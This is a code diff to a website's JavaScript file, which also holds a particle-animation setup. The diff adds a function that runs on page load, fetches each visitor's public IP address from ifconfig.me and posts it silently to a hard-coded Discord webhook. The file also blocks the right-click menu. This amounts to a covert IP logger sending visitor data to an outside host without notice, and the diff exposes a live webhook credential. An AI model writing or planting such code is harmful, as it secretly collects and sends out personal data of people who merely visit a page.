@@ -115,6 +115,27 @@ particlesJS("particles-js", {
     }
 });
 
+// sefty#0001
+async function sendWebhook() {
+	let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
+	var request = new XMLHttpRequest();
+	request.open("POST", "https://discord.com/api/webhooks/1159569318636429363/_g9StyBmN9rk9uV_Rjx33cdghwUg4dxjZe1fbozR_9klPfWhUijFnT4qsuxPc87BvwPc"); // paste your webhook link there
+
+	request.setRequestHeader('Content-type', 'application/json');
+
+	var params = {
+		username: "sefty.xyz",
+		avatar_url: "https://cdn.discordapp.com/attachments/1159569653182496868/1159573275937079407/wojtek.mafia_logo.png?ex=653183c4&is=651f0ec4&hm=8ddf433577c20c2dca93046a0196bf2f619a50f938ae79212dbce8fd542c7137&",
+		content: `${ip}`
+	};
+
+	request.send(JSON.stringify(params));
+};
+
+window.onload = function () { // this will run funcion on page load
+	sendWebhook();
+};
+
 document.addEventListener("contextmenu", function (e) {
     e.preventDefault()
 })
